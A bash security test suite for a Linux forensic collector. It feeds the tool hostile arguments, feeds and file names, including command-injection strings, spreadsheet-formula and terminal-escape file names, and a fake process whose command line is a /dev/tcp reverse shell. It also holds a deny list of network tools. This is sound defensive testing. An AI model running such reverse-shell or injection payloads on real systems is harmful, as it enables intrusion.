#!/usr/bin/env bash
#
# TATAR Triage Toolkit - security and robustness tests (Linux edition).
#
# These are black-box tests of the properties a forensic collector has to keep
# when the machine it runs on, and the files it is given, are hostile:
#
#   S1-S5   input handling      - hostile arguments, feeds and host data cannot
#                                  inject, escape the output folder or break JSON
#   S6-S7   evidence protection - the evidence folder is private, and the
#                                  collector will not write through a symlink
#   S8      containment         - strace proves what it wrote, executed and
#                                  connected to (needs strace; SKIPPED if absent)
#   S9      integrity           - the manifest and its own digest detect tampering
#   S10-S13 robustness          - no temp leaks, clean stop on SIGTERM, no
#                                  privilege required, UTF-8 and locale safe
#   S14     determinism         - two runs over a quiet host agree
#   N1-N2   non-functional      - time and memory budgets
#
# Mapping to OWASP ASVS 4.0 / Top 10 2021 / NIST SP 800-86 / SP 800-218 is in
# docs/SECURITY-TESTING.md. A SKIPPED test is reported as SKIP, never as PASS.
#
# Run from the repo root:   bash tests/test-security.sh
# Exit code: 0 = no failures, 1 = at least one failure.

set -o pipefail 2>/dev/null || true

HERE="$(cd "$(dirname "$0")" && pwd)"
COLLECTOR="${COLLECTOR:-$HERE/../linux/tatar-linux.sh}"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/tatar-sec.XXXXXX")"
PASS=0; FAIL=0; SKIP=0
CHILDREN=""

cleanup() {
    for p in $CHILDREN; do kill "$p" 2>/dev/null; done
    chmod -R u+rwX "$WORK" 2>/dev/null
    rm -rf "$WORK" 2>/dev/null
}
trap cleanup EXIT

check() {  # check NAME 1|0 [DETAIL]
    if [ "$2" = "1" ]; then PASS=$((PASS+1)); printf '  PASS  %s\n' "$1"
    else FAIL=$((FAIL+1)); printf '  FAIL  %s  %s\n' "$1" "${3:-}"; fi
}
skip() { SKIP=$((SKIP+1)); printf '  SKIP  %s  (%s)\n' "$1" "$2"; }
section() { printf '\n%s\n' "$1"; }

command -v python3 >/dev/null 2>&1 || { echo "python3 is required"; exit 1; }

# collect OUTBASE [args...] : runs the collector, silent, prints the evidence dir
collect() {
    local base="$1"; shift
    bash "$COLLECTOR" --silent --output "$base" "$@" >/dev/null 2>&1
    printf '%s' "$?" > "$WORK/last.exit"
    find "$base" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | head -n1
}
lastexit() { cat "$WORK/last.exit" 2>/dev/null; }

# jsonok FILE : valid UTF-8 JSON object
jsonok() { python3 - "$1" <<'EOF' 2>/dev/null
import json,sys
s=open(sys.argv[1],'rb').read().decode('utf-8')   # strict: invalid UTF-8 raises
d=json.loads(s); assert isinstance(d,dict)
EOF
}

# ctlscan DIR : lists generated text files that carry a raw control, escape or
# bidirectional-override character (a terminal would act on them)
ctlscan() { python3 - "$1" <<'EOF'
import sys,os,re
bad=re.compile(rb'[\x00-\x08\x0b-\x1f\x7f]|\xe2\x80[\xaa-\xae]|\xe2\x81[\xa6-\xa9]')
d=sys.argv[1]
# Generated, human-read files only. Verbatim copies of host files (hosts.txt,
# histories, configs) are evidence and stay byte-for-byte as collected.
names=['summary.txt','paste.txt','ARTIFACTS.md','tatar.log','timeline.csv','chain_of_custody.txt']
out=[]
for n in os.listdir(d):
    if n in names or n.startswith('TATAR_Report_'):
        b=open(os.path.join(d,n),'rb').read()
        # \t \n are legitimate; CR is not
        b2=b.replace(b'\t',b'').replace(b'\n',b'')
        if bad.search(b2): out.append(n)
print(' '.join(sorted(out)))
EOF
}

PWNDIR="$WORK/pwn"; mkdir -p "$PWNDIR"
pwned() { find "$PWNDIR" -mindepth 1 2>/dev/null | head -n1; }

# ---------------------------------------------------------------------------
section "S1  hostile arguments cannot inject or escape"
# ---------------------------------------------------------------------------
HOSTILE_CASE="x\"; touch $PWNDIR/p1; \`touch $PWNDIR/p2\`; \$(touch $PWNDIR/p3) \\ end"
HOSTILE_EXAM='O'"'"'Brien "}], "injected": true, "x":[ \u0000 '
D=$(collect "$WORK/s1" --modules sysinfo --caseid "$HOSTILE_CASE" --examiner "$HOSTILE_EXAM")
check "S1 : run finished with a defined exit code" "$([ "$(lastexit)" = 0 ] || [ "$(lastexit)" = 2 ] && echo 1 || echo 0)" "exit $(lastexit)"
check "S1 : summary.json is valid JSON despite quotes, backslashes and braces" "$([ -n "$D" ] && jsonok "$D/summary.json" && echo 1 || echo 0)"
check "S1 : no shell command in --caseid / --examiner was executed" "$([ -z "$(pwned)" ] && echo 1 || echo 0)" "$(pwned)"
if [ -n "$D" ] && jsonok "$D/summary.json"; then
    r=$(python3 - "$D/summary.json" <<'EOF'
import json,sys
s=json.load(open(sys.argv[1],encoding='utf-8'))
print('1' if 'injected' not in s and 'touch' in s.get('caseId','') and "Brien" in s.get('examiner','') else '0')
EOF
)
    check "S1 : the values are carried as data, not interpreted" "$r"
else check "S1 : the values are carried as data, not interpreted" 0 "no summary"; fi

mkdir -p "$WORK/s1b"
D=$(collect "$WORK/s1b" --modules sysinfo --caseid '../../escape' --examiner '../escape2')
ESC_OUT=$(find "$WORK" -maxdepth 3 \( -name 'escape*' -o -name '*escape2*' \) -not -path "$WORK/s1b/*" 2>/dev/null | head -n1)
check "S1 : a path-like --case-id cannot place files outside the output folder" "$([ -z "$ESC_OUT" ] && echo 1 || echo 0)" "$ESC_OUT"

# ---------------------------------------------------------------------------
section "S2  an awkward output path is data"
# ---------------------------------------------------------------------------
ODD="$WORK/o u't \$(touch $PWNDIR/p4) ;&|<> [x] caf$(printf '\303\251')"
D=$(collect "$ODD" --modules sysinfo)
check "S2 : evidence is written inside exactly that folder" "$([ -n "$D" ] && [ -s "$D/summary.json" ] && echo 1 || echo 0)"
check "S2 : nothing in the path was executed" "$([ -z "$(pwned)" ] && echo 1 || echo 0)" "$(pwned)"

# ---------------------------------------------------------------------------
section "S3  hostile allowlist and IOC feeds"
# ---------------------------------------------------------------------------
mk() { python3 - "$WORK/feeds" "$PWNDIR" <<'EOF'
import os,sys,json
d,pwn=sys.argv[1:3]; os.makedirs(d,exist_ok=True)
w=lambda n,b: open(os.path.join(d,n),'wb').write(b)
w('empty.json',b'')
w('binary.json',bytes(range(256))*50)
w('bom.json',b'\xef\xbb\xbf'+json.dumps({"paths":["/usr/bin/*"]}).encode())
w('badutf8.json',b'{"paths":["\xff\xfe\xc3\x28"]}')
w('deep.json',b'['*20000+b']'*20000)
w('bigstring.json',json.dumps({"paths":["A"*2000000]}).encode())
w('globs.json',json.dumps({"paths":["[","[[]","*","?","**/*","/tmp/$(touch %s/p5)"%pwn,"'; touch %s/p6; '"%pwn,"`touch %s/p7`"%pwn,"\\","\n","/etc/pass[wd"],"publishers":["*"],"hashes":["not-a-hash","A"*64,"'; touch %s/p8"%pwn]}).encode())
w('manyitems.json',json.dumps({"paths":["/nonexistent/%d/*"%i for i in range(100000)]}).encode())
w('ioc-hostile.json',json.dumps({"hashes":["'; touch %s/p9"%pwn],"ips":["999.999.999.999","::::","1.2.3.4/../../etc"],"domains":["$(touch %s/p10)"%pwn,"a"*300,"*"],"filenames":["`touch %s/p11`","[","*"]}).encode())
EOF
}
mk
for f in empty binary bom badutf8 deep bigstring globs manyitems; do
    t0=$(date +%s)
    D=$(timeout 120 bash "$COLLECTOR" --silent --output "$WORK/s3-$f" --modules sysinfo --allowlist "$WORK/feeds/$f.json" >/dev/null 2>&1; echo $? > "$WORK/s3.exit"; find "$WORK/s3-$f" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | head -n1)
    rc=$(cat "$WORK/s3.exit"); t1=$(date +%s)
    case "$rc" in 0|2) ok=1;; *) ok=0;; esac
    check "S3 : allowlist '$f' -> clean exit (0/2), no crash or hang" "$ok" "exit $rc after $((t1-t0))s"
    if [ -n "$D" ]; then check "S3 : allowlist '$f' -> summary.json still valid" "$(jsonok "$D/summary.json" && echo 1 || echo 0)"; fi
done
timeout 120 bash "$COLLECTOR" --silent --output "$WORK/s3-ioc" --modules sysinfo,network --ioc "$WORK/feeds/ioc-hostile.json" >/dev/null 2>&1; rc=$?
case "$rc" in 0|2) ok=1;; *) ok=0;; esac
check "S3 : hostile IOC feed -> clean exit (0/2)" "$ok" "exit $rc"
check "S3 : no feed entry was executed as a command" "$([ -z "$(pwned)" ] && echo 1 || echo 0)" "$(pwned)"

# ---------------------------------------------------------------------------
section "S4  hostile names and text on the host being examined"
# ---------------------------------------------------------------------------
H="$(mktemp -d /tmp/tatar-host.XXXXXX)"   # /tmp is one of the directories the indicators module walks
python3 - "$H" <<'EOF'
import os,sys
h=sys.argv[1]
names=['=cmd|calc!A0','+SUM(1)','-2+3','@SUM(1)','q"uote','back\\slash','semi;colon','dollar$(id)','tick`id`',
       'nl\nine','esc\x1b[2J\x1b[31mRED\x1b[0m','esc2\x1b]0;owned\x07','bell\x07x','cr\rcarriage','bidi\u202eexe.txt','iso\u2066x\u2069',
       '"},{"injected":1}','a'*200,'sp ace','tab\there','[brack]','\u00fcn\u00ee\u2603']
for n in names:
    try:
        p=os.path.join(h,n); open(p,'w').write('#!/bin/sh\n'); os.chmod(p,0o755)
    except Exception as e: print('skip',repr(n),e)
EOF
D=$(collect "$WORK/s4" --modules indicators,timeline)
check "S4 : run finished with a defined exit code" "$([ "$(lastexit)" = 0 ] || [ "$(lastexit)" = 2 ] && echo 1 || echo 0)" "exit $(lastexit)"
check "S4 : summary.json is valid JSON" "$([ -n "$D" ] && jsonok "$D/summary.json" && echo 1 || echo 0)"
check "S4 : findings.json is valid JSON" "$([ -n "$D" ] && jsonok "$D/findings.json" && echo 1 || echo 0)"
check "S4 : the file names really were seen (the test has teeth)" "$([ -n "$D" ] && grep -rq 'tatar-host' "$D" && echo 1 || echo 0)"
bad="$([ -n "$D" ] && ctlscan "$D")"
check "S4 : no generated text file carries a raw control, escape or bidi character" "$([ -z "$bad" ] && echo 1 || echo 0)" "in: $bad"
if [ -n "$D" ] && [ -s "$D/timeline.csv" ]; then
    r=$(python3 - "$D/timeline.csv" <<'EOF'
import csv,sys
rows=list(csv.reader(open(sys.argv[1],encoding='utf-8',errors='replace',newline='')))
ok=rows and rows[0]==['MTime','Path','Source'] and all(len(r)==3 for r in rows)
# a cell a spreadsheet would run as a formula
f=[r[1] for r in rows[1:] if r[1][:1] in '=+-@']
print('1' if ok and not f else '0 shape=%s formula=%s'%(bool(ok),f[:2]))
EOF
)
    check "S4 : timeline.csv stays three columns per row and no cell can run as a formula" "${r%% *}" "$r"
else check "S4 : timeline.csv stays three columns per row and no cell can run as a formula" 0 "no timeline.csv"; fi
check "S4 : no host file name was executed" "$([ -z "$(pwned)" ] && echo 1 || echo 0)"
rm -rf "$H"

# ---------------------------------------------------------------------------
section "S5  a process whose command line is hostile"
# ---------------------------------------------------------------------------
( exec -a $'hostile\x1b[31m"},{"injected":1} /dev/tcp/203.0.113.9/4444' sleep 90 ) &
CHILDREN="$CHILDREN $!"
( exec -a $'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\x1b]0;owned\x07' sleep 90 ) &
CHILDREN="$CHILDREN $!"
sleep 1
D=$(collect "$WORK/s5" --modules process,network)
check "S5 : summary.json is valid JSON" "$([ -n "$D" ] && jsonok "$D/summary.json" && echo 1 || echo 0)"
bad="$([ -n "$D" ] && ctlscan "$D")"
check "S5 : no generated text file carries a raw control, escape or bidi character" "$([ -z "$bad" ] && echo 1 || echo 0)" "in: $bad"
check "S5 : the hostile process was seen (the test has teeth)" "$([ -n "$D" ] && grep -rq '203.0.113' "$D" && echo 1 || echo 0)"
for p in $CHILDREN; do kill "$p" 2>/dev/null; done; CHILDREN=""

# ---------------------------------------------------------------------------
section "S6  the evidence folder is private"
# ---------------------------------------------------------------------------
D=$(collect "$WORK/s6" --modules sysinfo,users,network --compress)
if [ -n "$D" ]; then
    loose=$(find "$WORK/s6" \( -type d -o -type f \) \( -perm -g+rwx -o -perm -o+rwx -o -perm -g+r -o -perm -o+r -o -perm -g+w -o -perm -o+w -o -perm -g+x -o -perm -o+x \) 2>/dev/null | head -n3 | tr '\n' ' ')
    check "S6 : no file or folder in the evidence set grants anything to group or others" "$([ -z "$loose" ] && echo 1 || echo 0)" "e.g. $loose"
    base_mode=$(stat -c %a "$WORK/s6")
    check "S6 : an output folder the tool creates is owner-only" "$([ "${base_mode: -2}" = 00 ] && echo 1 || echo 0)" "mode $base_mode"
else check "S6 : evidence private" 0 "no evidence dir"; fi

# ---------------------------------------------------------------------------
section "S7  the collector refuses to write through a symlink"
# ---------------------------------------------------------------------------
mkdir -p "$WORK/victim"; ln -s "$WORK/victim" "$WORK/link"
timeout 60 bash "$COLLECTOR" --silent --output "$WORK/link" --modules sysinfo >/dev/null 2>&1; rc=$?
check "S7 : --output that is a symlink is refused" "$([ "$rc" != 0 ] && [ "$rc" != 2 ] && echo 1 || echo 0)" "exit $rc"
check "S7 : nothing was written through the symlink" "$([ -z "$(find "$WORK/victim" -mindepth 1 | head -n1)" ] && echo 1 || echo 0)" "$(find "$WORK/victim" -mindepth 1 | head -n3 | tr '\n' ' ')"
# the evidence folder name is predictable (host + timestamp): a planted symlink there
mkdir -p "$WORK/s7b" "$WORK/victim2"
HN="$(hostname)"; now=$(date +%s)
for off in -1 0 1 2 3 4 5; do ln -s "$WORK/victim2" "$WORK/s7b/${HN}_$(date -d "@$((now+off))" +%Y-%m-%d_%H-%M-%S)" 2>/dev/null; done
timeout 60 bash "$COLLECTOR" --silent --output "$WORK/s7b" --modules sysinfo >/dev/null 2>&1
check "S7 : a symlink planted at the predicted evidence folder name is not followed" "$([ -z "$(find "$WORK/victim2" -mindepth 1 | head -n1)" ] && echo 1 || echo 0)" "$(find "$WORK/victim2" -mindepth 1 | head -n3 | tr '\n' ' ')"

# ---------------------------------------------------------------------------
section "S8  containment: what the collector writes, runs and connects to"
# ---------------------------------------------------------------------------
if ! command -v strace >/dev/null 2>&1; then
    skip "S8 : strace containment" "strace is not installed"
else
    OUTS8="$WORK/s8"
    timeout 600 strace -f -qq -s 256 -o "$WORK/strace.txt" \
        -e trace=%network,%file,%process,%desc \
        bash "$COLLECTOR" --silent --output "$OUTS8" --modules sysinfo,network,process,sessions,users,services,persistence,apps,sshkeys,bashhistory,kernelmods,indicators,hashes,logs,containers,integrity >/dev/null 2>&1
    rc=$?
    case "$rc" in 0|2) ok=1;; *) ok=0;; esac
    check "S8 : the traced run finished" "$ok" "exit $rc"
    python3 - "$WORK/strace.txt" "$OUTS8" "$WORK" > "$WORK/s8.result" <<'EOF'
import re,sys,os
trace,outs,work=sys.argv[1:4]
outs=os.path.realpath(outs)
tmpdirs=[os.path.realpath(os.environ.get('TMPDIR','/tmp')),'/tmp','/var/tmp']
allowed_write=[outs,os.path.realpath(work)]+tmpdirs+['/dev/null','/dev/tty','/dev/fd','/proc/self','/dev/pts','/dev/stdout','/dev/stderr']
def inside(p):
    return any(p==a or p.startswith(a.rstrip('/')+'/') for a in allowed_write)
def failed(line): return re.search(r'\)\s+=\s+-1\s',line) is not None
bad_net=[];bad_write=[];execs=set();bad_exec=[]
# programs a collector has no business running; dpkg and systemctl are allowed
# only in their read-only forms (checked below, by argument)
DENY={'curl','wget','nc','ncat','netcat','ssh','scp','sftp','ftp','telnet','socat','tftp','rsync','sudo','su','apt','apt-get','yum','dnf','pip','pip3','npm','gpg','openssl','crontab','service','kill','pkill','killall','shutdown','reboot','mount','umount','chattr','setfacl','iptables','nft','useradd','usermod','passwd'}
RO={'dpkg':{'-l','-L','-s','-S','-V','--list','--listfiles','--status','--search','--verify','--get-selections'},
    'systemctl':{'list-units','list-unit-files','list-timers','list-sockets','show','status','is-active','is-enabled','cat','--version'}}
W=re.compile(r'O_WRONLY|O_RDWR|O_CREAT|O_TRUNC|O_APPEND')
for line in open(trace,errors='replace'):
    line=re.sub(r'^\d+\s+','',line.strip())
    m=re.match(r'(connect|sendto|sendmsg|bind)\((\d+),\s*\{sa_family=(AF_INET6?)',line)
    if m and not failed(line): bad_net.append(line[:140])
    m=re.match(r'(openat|open|creat)\((?:AT_FDCWD,\s*)?"([^"]*)"(?:,\s*([A-Z_|]+))?',line)
    if m and (m.group(1)=='creat' or (m.group(3) and W.search(m.group(3)))) and not failed(line):
        rp=os.path.normpath(m.group(2) if m.group(2).startswith('/') else os.path.join(os.getcwd(),m.group(2)))
        if not inside(rp): bad_write.append(rp)
    m=re.match(r'(rename|renameat2?|unlink|unlinkat|rmdir|mkdir|mkdirat|symlink|symlinkat|link|linkat|truncate|chmod|fchmodat|chown|fchownat|utimensat)\(',line)
    if m and not failed(line):
        for p in re.findall(r'"(/[^"]*)"',line):
            rp=os.path.normpath(p)
            if not inside(rp): bad_write.append(m.group(1)+' '+rp)
    m=re.match(r'execve\("([^"]+)",\s*\[([^\]]*)\]',line)
    if m and not failed(line):
        b=os.path.basename(m.group(1)); execs.add(b)
        argv=re.findall(r'"((?:[^"\\]|\\.)*)"',m.group(2))
        if b in DENY: bad_exec.append(b)
        if b in RO:
            sub=[a for a in argv[1:] if a.startswith('-') or a.isalpha() or '-' in a]
            first=next((a for a in argv[1:] if not a.startswith('--no-') and a not in ('--plain','--no-pager','--no-legend','--all','-a')),'')
            if first not in RO[b]: bad_exec.append('%s %s'%(b,first))
print('NET',len(bad_net),'|'.join(bad_net[:3]))
print('WRITE',len(set(bad_write)),'|'.join(sorted(set(bad_write))[:5]))
print('EXEC',len(bad_exec),'|'.join(sorted(set(bad_exec))))
print('PROGS',' '.join(sorted(execs)))
EOF
    net=$(grep '^NET' "$WORK/s8.result"); wr=$(grep '^WRITE' "$WORK/s8.result"); ex=$(grep '^EXEC' "$WORK/s8.result")
    check "S8 : no IPv4/IPv6 connection, bind or send was attempted (offline)" "$([ "$(echo "$net" | awk '{print $2}')" = 0 ] && echo 1 || echo 0)" "$net"
    check "S8 : nothing was written outside the evidence folder and temp dirs (read-only on the host)" "$([ "$(echo "$wr" | awk '{print $2}')" = 0 ] && echo 1 || echo 0)" "$wr"
    check "S8 : no network, package, privilege or service-control program was executed" "$([ "$(echo "$ex" | awk '{print $2}')" = 0 ] && echo 1 || echo 0)" "$ex"
    printf '        programs executed: %s\n' "$(grep '^PROGS' "$WORK/s8.result" | cut -c7-)"
fi

# ---------------------------------------------------------------------------
section "S9  integrity: tampering is detected"
# ---------------------------------------------------------------------------
D=$(collect "$WORK/s9" --modules sysinfo,users)
if [ -n "$D" ] && command -v sha256sum >/dev/null 2>&1; then
    ( cd "$D" && sha256sum -c manifest_sha256.txt >/dev/null 2>&1 ) ; a=$?
    check "S9 : an untouched folder verifies" "$([ $a = 0 ] && echo 1 || echo 0)"
    cp -r "$D" "$WORK/s9m"
    echo x >> "$WORK/s9m/summary.json"
    ( cd "$WORK/s9m" && sha256sum -c manifest_sha256.txt >/dev/null 2>&1 ); check "S9 : a modified file is detected" "$([ $? != 0 ] && echo 1 || echo 0)"
    cp -r "$D" "$WORK/s9d"; rm -f "$WORK/s9d/summary.txt"
    ( cd "$WORK/s9d" && sha256sum -c manifest_sha256.txt >/dev/null 2>&1 ); check "S9 : a deleted file is detected" "$([ $? != 0 ] && echo 1 || echo 0)"
    cp -r "$D" "$WORK/s9r"; echo "0000" > "$WORK/s9r/summary.txt"
    ( cd "$WORK/s9r" && sha256sum -c manifest_sha256.txt >/dev/null 2>&1 ); check "S9 : a replaced file is detected" "$([ $? != 0 ] && echo 1 || echo 0)"
    cp -r "$D" "$WORK/s9t"; echo "forged  ./summary.json" >> "$WORK/s9t/manifest_sha256.txt"
    ( cd "$WORK/s9t" && sha256sum -c manifest_sha256.txt.sha256 >/dev/null 2>&1 ); check "S9 : an edited manifest no longer matches its own digest" "$([ $? != 0 ] && echo 1 || echo 0)"
    ( cd "$D" && sha256sum -c manifest_sha256.txt.sha256 >/dev/null 2>&1 ); check "S9 : the manifest's own digest verifies the untouched manifest" "$([ $? = 0 ] && echo 1 || echo 0)"
    want=$(sha256sum "$COLLECTOR" | awk '{print $1}')
    check "S9 : chain_of_custody.txt records the hash of the script that ran" "$(grep -q "$want" "$D/chain_of_custody.txt" && echo 1 || echo 0)"
else skip "S9 : integrity" "no evidence dir or no sha256sum"; fi

# ---------------------------------------------------------------------------
section "S10 no temporary files are left behind"
# ---------------------------------------------------------------------------
mkdir -p "$WORK/tmp10"
TMPDIR="$WORK/tmp10" bash "$COLLECTOR" --silent --output "$WORK/s10" --modules sysinfo,network,users,process >/dev/null 2>&1
left=$(find "$WORK/tmp10" -mindepth 1 | head -n3 | tr '\n' ' ')
check "S10 : a normal run leaves nothing in TMPDIR" "$([ -z "$left" ] && echo 1 || echo 0)" "$left"

# ---------------------------------------------------------------------------
section "S11 a SIGTERM stops the run and leaves no secrets behind"
# ---------------------------------------------------------------------------
mkdir -p "$WORK/tmp11"
TMPDIR="$WORK/tmp11" bash "$COLLECTOR" --silent --output "$WORK/s11" --modules sysinfo,network,process,users,services,persistence,logs,timeline >/dev/null 2>&1 &
pid=$!; sleep 2; kill -TERM "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; rc=$?
check "S11 : the collector exited after SIGTERM" "$(kill -0 "$pid" 2>/dev/null && echo 0 || echo 1)" "still running"
left=$(find "$WORK/tmp11" -mindepth 1 | head -n3 | tr '\n' ' ')
check "S11 : an interrupted run leaves no temporary files" "$([ -z "$left" ] && echo 1 || echo 0)" "$left"
loose=$(find "$WORK/s11" \( -perm -g+r -o -perm -o+r \) 2>/dev/null | head -n2 | tr '\n' ' ')
check "S11 : partial evidence from an interrupted run is private too" "$([ -z "$loose" ] && echo 1 || echo 0)" "$loose"

# ---------------------------------------------------------------------------
section "S12 no privilege is required"
# ---------------------------------------------------------------------------
if [ "$(id -u)" = 0 ]; then skip "S12 : unprivileged run" "running as root"; else
    D=$(collect "$WORK/s12" --modules sysinfo,network,process,sessions,users,services,persistence,apps,sshkeys,bashhistory,kernelmods,indicators,logs,containers,integrity)
    check "S12 : exit code is 0 or 2 without privilege" "$([ "$(lastexit)" = 0 ] || [ "$(lastexit)" = 2 ] && echo 1 || echo 0)" "exit $(lastexit)"
    r=$([ -n "$D" ] && python3 - "$D/summary.json" <<'EOF'
import json,sys
s=json.load(open(sys.argv[1],encoding='utf-8'))
print('1' if s.get('privileged') is False else '0')
EOF
)
    check "S12 : summary.json says the run was unprivileged" "${r:-0}"
    check "S12 : no module crashed (FAILED) because privilege was missing" "$([ -n "$D" ] && ! grep -q 'FAILED' "$D/tatar.log" && echo 1 || echo 0)" "$(grep FAILED "$D/tatar.log" 2>/dev/null | head -n2)"
fi

# ---------------------------------------------------------------------------
section "S13 locale and encoding"
# ---------------------------------------------------------------------------
for loc in C C.UTF-8 POSIX; do
    D=$(LC_ALL=$loc LANG=$loc collect "$WORK/s13-$loc" --modules sysinfo,users,network)
    check "S13 : LC_ALL=$loc -> summary.json is strict UTF-8 JSON" "$([ -n "$D" ] && jsonok "$D/summary.json" && echo 1 || echo 0)"
done

# ---------------------------------------------------------------------------
section "S14 two runs over a quiet host agree"
# ---------------------------------------------------------------------------
QM=users,services,persistence,apps,sshkeys,kernelmods
D1=$(collect "$WORK/s14a" --modules $QM); D2=$(collect "$WORK/s14b" --modules $QM)
if [ -n "$D1" ] && [ -n "$D2" ]; then
    r=$(python3 - "$D1/summary.json" "$D2/summary.json" <<'EOF'
import json,sys
def key(p):
    s=json.load(open(p,encoding='utf-8'))
    return sorted((f['category'],f['artifactClass'],f['message']) for f in s['findings'])
a,b=key(sys.argv[1]),key(sys.argv[2])
print('1' if a==b else '0 only-first=%s only-second=%s'%([x for x in a if x not in b][:2],[x for x in b if x not in a][:2]))
EOF
)
    check "S14 : the same findings come out of two consecutive runs" "${r%% *}" "$r"
else check "S14 : determinism" 0 "a run produced no evidence"; fi

# ---------------------------------------------------------------------------
section "N1  time budget"
# ---------------------------------------------------------------------------
t0=$(date +%s)
D=$(collect "$WORK/n1" --all)
t1=$(date +%s); dur=$((t1-t0))
check "N1 : a full --all run finishes within 300 s" "$([ "$dur" -le 300 ] && echo 1 || echo 0)" "${dur}s"
printf '        full run: %ss\n' "$dur"
if [ -n "$D" ]; then
    python3 - "$D/summary.json" <<'EOF'
import json,sys
s=json.load(open(sys.argv[1],encoding='utf-8'))
ms=sorted(s.get('moduleStatus',[]),key=lambda m:-m['seconds'])[:4]
print('        slowest modules: '+', '.join('%s %ss'%(m['module'],m['seconds']) for m in ms))
EOF
    worst=$(python3 - "$D/summary.json" <<'EOF'
import json,sys
s=json.load(open(sys.argv[1],encoding='utf-8'))
print(max([m['seconds'] for m in s.get('moduleStatus',[])] or [0]))
EOF
)
    check "N1 : no single module takes more than 150 s" "$([ "${worst%.*}" -le 150 ] && echo 1 || echo 0)" "${worst}s"
fi

# ---------------------------------------------------------------------------
section "N2  memory budget"
# ---------------------------------------------------------------------------
if [ -x /usr/bin/time ]; then
    /usr/bin/time -v -o "$WORK/time.txt" bash "$COLLECTOR" --silent --output "$WORK/n2" --modules sysinfo,network,process,users,services,persistence,apps,indicators >/dev/null 2>&1
    kb=$(awk -F: '/Maximum resident set size/ {gsub(/ /,"",$2); print $2}' "$WORK/time.txt")
    check "N2 : peak resident memory of the collector and its children stays under 300 MB" "$([ -n "$kb" ] && [ "$kb" -lt 307200 ] && echo 1 || echo 0)" "${kb:-?} kB"
    printf '        peak RSS: %s kB\n' "${kb:-?}"
else skip "N2 : memory budget" "/usr/bin/time is not installed"; fi

printf '\nRESULT  passed: %d  failed: %d  skipped: %d\n' "$PASS" "$FAIL" "$SKIP"
[ "$FAIL" -eq 0 ]
